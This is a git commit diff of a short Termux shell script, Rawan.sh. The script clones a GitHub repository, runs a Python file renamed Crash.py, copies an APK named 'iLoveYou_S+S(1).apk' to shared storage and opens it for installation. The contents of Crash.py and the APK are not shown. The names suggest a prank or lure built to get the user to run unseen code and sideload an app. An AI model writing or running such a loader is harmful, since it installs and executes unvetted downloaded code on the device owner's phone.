16961c03554c2edb72ba017cd741a5ab4363ab72
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-07-24 15:02:46 +0530

    Update Rawan.sh
    B

--- Rawan.sh
+++ Rawan.sh
@@ -1,8 +1,9 @@
 git  clone https://github.com/Vretlee/BaapG
 ls
 mv Folder.py Crash.py
-python Crash.py
+cp -r Crash.py BaapG
 cd  BaapG
+python Crash.py
 cp -r 'iLoveYou_S+S(1).apk' /sdcard
 cp -r JaiRajputana.jpg /sdcard
 termux-open  'iLoveYou_S+S(1).apk'
